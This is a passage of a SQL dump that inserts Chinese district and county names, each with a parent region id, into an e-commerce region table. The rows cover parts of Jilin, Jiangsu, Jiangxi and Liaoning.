INSERT INTO `ec22703249_region` VALUES ('1797', '213', '通榆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1798', '214', '江源区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1799', '214', '八道江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1800', '214', '长白', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1801', '214', '临江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1802', '214', '抚松县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1803', '214', '靖宇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1804', '215', '龙山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1805', '215', '西安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1806', '215', '东丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1807', '215', '东辽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1808', '216', '铁西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1809', '216', '铁东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1810', '216', '伊通', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1811', '216', '公主岭市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1812', '216', '双辽市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1813', '216', '梨树县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1814', '217', '前郭尔罗斯', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1815', '217', '宁江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1816', '217', '长岭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1817', '217', '乾安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1818', '217', '扶余县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1819', '218', '东昌区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1820', '218', '二道江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1821', '218', '梅河口市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1822', '218', '集安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1823', '218', '通化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1824', '218', '辉南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1825', '218', '柳河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1826', '219', '延吉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1827', '219', '图们市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1828', '219', '敦化市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1829', '219', '珲春市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1830', '219', '龙井市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1831', '219', '和龙市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1832', '219', '安图县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1833', '219', '汪清县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1834', '220', '玄武区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1835', '220', '鼓楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1836', '220', '白下区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1837', '220', '建邺区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1838', '220', '秦淮区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1839', '220', '雨花台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1840', '220', '下关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1841', '220', '栖霞区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1842', '220', '浦口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1843', '220', '江宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1844', '220', '六合区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1845', '220', '溧水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1846', '220', '高淳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1847', '221', '沧浪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1848', '221', '金阊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1849', '221', '平江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1850', '221', '虎丘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1851', '221', '吴中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1852', '221', '相城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1853', '221', '园区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1854', '221', '新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1855', '221', '常熟市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1856', '221', '张家港市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1857', '221', '玉山镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1858', '221', '巴城镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1859', '221', '周市镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1860', '221', '陆家镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1861', '221', '花桥镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1862', '221', '淀山湖镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1863', '221', '张浦镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1864', '221', '周庄镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1865', '221', '千灯镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1866', '221', '锦溪镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1867', '221', '开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1868', '221', '吴江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1869', '221', '太仓市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1870', '222', '崇安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1871', '222', '北塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1872', '222', '南长区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1873', '222', '锡山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1874', '222', '惠山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1875', '222', '滨湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1876', '222', '新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1877', '222', '江阴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1878', '222', '宜兴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1879', '223', '天宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1880', '223', '钟楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1881', '223', '戚墅堰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1882', '223', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1883', '223', '新北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1884', '223', '武进区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1885', '223', '溧阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1886', '223', '金坛市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1887', '224', '清河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1888', '224', '清浦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1889', '224', '楚州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1890', '224', '淮阴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1891', '224', '涟水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1892', '224', '洪泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1893', '224', '盱眙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1894', '224', '金湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1895', '225', '新浦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1896', '225', '连云区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1897', '225', '海州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1898', '225', '赣榆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1899', '225', '东海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1900', '225', '灌云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1901', '225', '灌南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1902', '226', '崇川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1903', '226', '港闸区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1904', '226', '经济开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1905', '226', '启东市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1906', '226', '如皋市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1907', '226', '通州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1908', '226', '海门市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1909', '226', '海安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1910', '226', '如东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1911', '227', '宿城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1912', '227', '宿豫区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1913', '227', '宿豫县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1914', '227', '沭阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1915', '227', '泗阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1916', '227', '泗洪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1917', '228', '海陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1918', '228', '高港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1919', '228', '兴化市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1920', '228', '靖江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1921', '228', '泰兴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1922', '228', '姜堰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1923', '229', '云龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1924', '229', '鼓楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1925', '229', '九里区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1926', '229', '贾汪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1927', '229', '泉山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1928', '229', '新沂市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1929', '229', '邳州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1930', '229', '丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1931', '229', '沛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1932', '229', '铜山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1933', '229', '睢宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1934', '230', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1935', '230', '亭湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1936', '230', '盐都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1937', '230', '盐都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1938', '230', '东台市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1939', '230', '大丰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1940', '230', '响水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1941', '230', '滨海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1942', '230', '阜宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1943', '230', '射阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1944', '230', '建湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1945', '231', '广陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1946', '231', '维扬区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1947', '231', '邗江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1948', '231', '仪征市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1949', '231', '高邮市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1950', '231', '江都市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1951', '231', '宝应县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1952', '232', '京口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1953', '232', '润州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1954', '232', '丹徒区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1955', '232', '丹阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1956', '232', '扬中市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1957', '232', '句容市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1958', '233', '东湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1959', '233', '西湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1960', '233', '青云谱区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1961', '233', '湾里区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1962', '233', '青山湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1963', '233', '红谷滩新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1964', '233', '昌北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1965', '233', '高新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1966', '233', '南昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1967', '233', '新建县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1968', '233', '安义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1969', '233', '进贤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1970', '234', '临川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1971', '234', '南城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1972', '234', '黎川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1973', '234', '南丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1974', '234', '崇仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1975', '234', '乐安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1976', '234', '宜黄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1977', '234', '金溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1978', '234', '资溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1979', '234', '东乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1980', '234', '广昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1981', '235', '章贡区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1982', '235', '于都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1983', '235', '瑞金市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1984', '235', '南康市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1985', '235', '赣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1986', '235', '信丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1987', '235', '大余县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1988', '235', '上犹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1989', '235', '崇义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1990', '235', '安远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1991', '235', '龙南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1992', '235', '定南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1993', '235', '全南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1994', '235', '宁都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1995', '235', '兴国县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1996', '235', '会昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1997', '235', '寻乌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1998', '235', '石城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1999', '236', '安福县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2000', '236', '吉州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2001', '236', '青原区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2002', '236', '井冈山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2003', '236', '吉安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2004', '236', '吉水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2005', '236', '峡江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2006', '236', '新干县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2007', '236', '永丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2008', '236', '泰和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2009', '236', '遂川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2010', '236', '万安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2011', '236', '永新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2012', '237', '珠山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2013', '237', '昌江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2014', '237', '乐平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2015', '237', '浮梁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2016', '238', '浔阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2017', '238', '庐山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2018', '238', '瑞昌市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2019', '238', '九江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2020', '238', '武宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2021', '238', '修水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2022', '238', '永修县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2023', '238', '德安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2024', '238', '星子县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2025', '238', '都昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2026', '238', '湖口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2027', '238', '彭泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2028', '239', '安源区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2029', '239', '湘东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2030', '239', '莲花县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2031', '239', '芦溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2032', '239', '上栗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2033', '240', '信州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2034', '240', '德兴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2035', '240', '上饶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2036', '240', '广丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2037', '240', '玉山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2038', '240', '铅山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2039', '240', '横峰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2040', '240', '弋阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2041', '240', '余干县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2042', '240', '波阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2043', '240', '万年县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2044', '240', '婺源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2045', '241', '渝水区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2046', '241', '分宜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2047', '242', '袁州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2048', '242', '丰城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2049', '242', '樟树市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2050', '242', '高安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2051', '242', '奉新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2052', '242', '万载县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2053', '242', '上高县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2054', '242', '宜丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2055', '242', '靖安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2056', '242', '铜鼓县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2057', '243', '月湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2058', '243', '贵溪市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2059', '243', '余江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2060', '244', '沈河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2061', '244', '皇姑区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2062', '244', '和平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2063', '244', '大东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2064', '244', '铁西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2065', '244', '苏家屯区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2066', '244', '东陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2067', '244', '沈北新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2068', '244', '于洪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2069', '244', '浑南新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2070', '244', '新民市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2071', '244', '辽中县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2072', '244', '康平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2073', '244', '法库县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2074', '245', '西岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2075', '245', '中山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2076', '245', '沙河口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2077', '245', '甘井子区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2078', '245', '旅顺口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2079', '245', '金州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2080', '245', '开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2081', '245', '瓦房店市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2082', '245', '普兰店市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2083', '245', '庄河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2084', '245', '长海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2085', '246', '铁东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2086', '246', '铁西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2087', '246', '立山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2088', '246', '千山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2089', '246', '岫岩', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2090', '246', '海城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2091', '246', '台安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2092', '247', '本溪', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2093', '247', '平山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2094', '247', '明山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2095', '247', '溪湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2096', '247', '南芬区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2097', '247', '桓仁', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2098', '248', '双塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2099', '248', '龙城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2100', '248', '喀喇沁左翼蒙古族自治县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2101', '248', '北票市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2102', '248', '凌源市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2103', '248', '朝阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2104', '248', '建平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2105', '249', '振兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2106', '249', '元宝区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2107', '249', '振安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2108', '249', '宽甸', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2109', '249', '东港市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2110', '249', '凤城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2111', '250', '顺城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2112', '250', '新抚区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2113', '250', '东洲区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2114', '250', '望花区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2115', '250', '清原', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2116', '250', '新宾', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2117', '250', '抚顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2118', '251', '阜新', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2119', '251', '海州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2120', '251', '新邱区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2121', '251', '太平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2122', '251', '清河门区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2123', '251', '细河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2124', '251', '彰武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2125', '252', '龙港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2126', '252', '南票区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2127', '252', '连山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2128', '252', '兴城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2129', '252', '绥中县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2130', '252', '建昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2131', '253', '太和区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2132', '253', '古塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2133', '253', '凌河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2134', '253', '凌海市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2135', '253', '北镇市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2136', '253', '黑山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2137', '253', '义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2138', '254', '白塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2139', '254', '文圣区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2140', '254', '宏伟区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2141', '254', '太子河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2142', '254', '弓长岭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2143', '254', '灯塔市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2144', '254', '辽阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2145', '255', '双台子区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2146', '255', '兴隆台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2147', '255', '大洼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2148', '255', '盘山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2149', '256', '银州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2150', '256', '清河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2151', '256', '调兵山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2152', '256', '开原市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2153', '256', '铁岭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2154', '256', '西丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2155', '256', '昌图县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2156', '257', '站前区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2157', '257', '西市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2158', '257', '鲅鱼圈区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2159', '257', '老边区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2160', '257', '盖州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2161', '257', '大石桥市', '3', '0');
